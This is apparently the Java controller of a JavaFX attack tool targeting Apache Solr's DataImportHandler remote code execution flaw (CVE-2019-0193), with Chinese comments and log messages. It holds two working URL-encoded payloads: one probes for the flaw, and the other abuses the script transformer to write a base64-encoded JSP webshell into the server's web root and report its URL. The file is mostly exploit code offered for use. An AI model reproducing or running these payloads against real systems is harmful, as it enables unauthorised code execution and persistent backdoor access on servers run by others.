package org.example.main;

import javafx.fxml.FXML;
import javafx.scene.control.ChoiceBox;
import javafx.scene.control.TextArea;
import javafx.scene.control.TextField;
import org.example.exp.CVE_2019_0193;
import org.example.tools.Shell;
import java.io.IOException;

public class mainController {
    @FXML
    private TextArea ta_log;
    @FXML
    private TextField tf_url,tf_core,tf_webpath;
    @FXML
    private ChoiceBox cb_webshell;

    @FXML
    public void initialize(){
        //打开工具时，初始化下拉列表选项，加载shell目录下的jsp马
        for(int i=0;i<Shell.readShell().size();i++){
            cb_webshell.getItems().add(Shell.readShell().get(i));
            cb_webshell.setValue(Shell.readShell().get(i));
        }
    }

    @FXML
    private void check() throws IOException {
        String payload1 = "%3CdataConfig%3E%0A%3CdataSource%20name%3D%22streamsrc%22%20type%3D%22ContentStreamDataSource%22%20loggerLevel%3D%22TRACE%22%20%2F%3E%0A%20%20%3Cscript%3E%3C!%5BCDATA%5B%0A%20%20%20%20%20%20%20%20%20%20function%20poc(row)%7B%0Avar%20buf%20%3D%20new%20java.lang.String(java.util.Base64.getDecoder().decode(%22Y2hlbmdnb25nbGE%3D%22))%3B%0Arow.put(%22title%22%2Cbuf)%3B%0Areturn%20row%3B%0A%0A%7D%0A%0A%5D%5D%3E%3C%2Fscript%3E%0A%0A%3Cdocument%3E%0A%20%20%20%20%3Centity%0A%20%20%20%20%20%20%20%20stream%3D%22true%22%0A%20%20%20%20%20%20%20%20name%3D%22entity1%22%0A%20%20%20%20%20%20%20%20datasource%3D%22streamsrc1%22%0A%20%20%20%20%20%20%20%20processor%3D%22XPathEntityProcessor%22%0A%20%20%20%20%20%20%20%20rootEntity%3D%22true%22%0A%20%20%20%20%20%20%20%20forEach%3D%22%2FRDF%2Fitem%22%0A%20%20%20%20%20%20%20%20transformer%3D%22script%3Apoc%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cfield%20column%3D%22title%22%20xpath%3D%22%2FRDF%2Fitem%2Ftitle%22%20%2F%3E%0A%20%20%20%20%3C%2Fentity%3E%0A%3C%2Fdocument%3E%0A%3C%2FdataConfig%3E";
        String str = CVE_2019_0193.step1(tf_url.getText());
        ta_log.appendText("开始检测："+tf_url.getText()+"\n");
        String core = str.split("!!!")[0];
        String webpath = str.split("!!!")[1];
        ta_log.appendText("第一个数据包发送成功。\n");
        tf_core.setText(core);
        ta_log.appendText("当前的core："+core+"\n");
        tf_webpath.setText(webpath);
        ta_log.appendText("当前的webpath："+webpath+"\n");
        String resp2 = CVE_2019_0193.step2(tf_url.getText(),core);
        ta_log.appendText(resp2 );
        String resp3 = CVE_2019_0193.step3(tf_url.getText(),core,payload1);
            if(resp3.contains("chenggongla")){
                ta_log.appendText("存在Apache Solr RCE(CVE-2019-0193)漏洞，请尝试getshell。\n");
            }else{
                ta_log.appendText("可能不存在Apache Solr RCE(CVE-2019-0193)漏洞，需手动验证。\n");
            }
    }
    @FXML
    private void GetShell() throws IOException {
        if(tf_core.getText().equals("")){
            ta_log.appendText("请输入core或点击检测。\n");
        }else{
            String shellBase64Str = Shell.GetShellBase64Str("./shell/"+cb_webshell.getValue().toString());
            String path = Shell.GenerateUUID()+".jsp";
            String payload = "%3CdataConfig%3E%0A%3CdataSource%20name%3D%22streamsrc%22%20type%3D%22ContentStreamDataSource%22%20loggerLevel%3D%22TRACE%22%20%2F%3E%0A%20%20%3Cscript%3E%3C!%5BCDATA%5B%0A%20%20%20%20%20%20%20%20%20%20function%20poc(row)%7B%0Avar%20buf%20%3D%20new%20java.io.BufferedWriter(new%20java.io.FileWriter(java.net.URLDecoder.decode(java.lang.Thread.currentThread().getContextClassLoader().getResource(%22%22).getPath().toString().replaceAll(%22file%3A%5C%2F%22%2C%20%22%22).split(%22WEB-INF%22)%5B0%5D%2B%22";
            payload = payload+path+"%22)))%3Bbuf.write(new%20java.lang.String(java.util.Base64.getDecoder().decode(%22";
            payload = payload+shellBase64Str+"%22)))%3Bbuf.close()%3B%0Arow.put(%22title%22%2C%22chenggongla%22)%3B%0Areturn%20row%3B%0A%0A%7D%0A%0A%5D%5D%3E%3C%2Fscript%3E%0A%0A%3Cdocument%3E%0A%20%20%20%20%3Centity%0A%20%20%20%20%20%20%20%20stream%3D%22true%22%0A%20%20%20%20%20%20%20%20name%3D%22entity1%22%0A%20%20%20%20%20%20%20%20datasource%3D%22streamsrc1%22%0A%20%20%20%20%20%20%20%20processor%3D%22XPathEntityProcessor%22%0A%20%20%20%20%20%20%20%20rootEntity%3D%22true%22%0A%20%20%20%20%20%20%20%20forEach%3D%22%2FRDF%2Fitem%22%0A%20%20%20%20%20%20%20%20transformer%3D%22script%3Apoc%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cfield%20column%3D%22title%22%20xpath%3D%22%2FRDF%2Fitem%2Ftitle%22%20%2F%3E%0A%20%20%20%20%3C%2Fentity%3E%0A%3C%2Fdocument%3E%0A%3C%2FdataConfig%3E";
            String resp3 = CVE_2019_0193.step3(tf_url.getText(),tf_core.getText(), payload);
            if(resp3.contains("chenggongla")){
                ta_log.appendText("第三个数据包发送成功。\n");
                ta_log.appendText("webshell："+tf_url.getText()+"/solr/"+path+"\n");
            }else{
                ta_log.appendText("webshell写入失败。");
            }
        }
    }
}
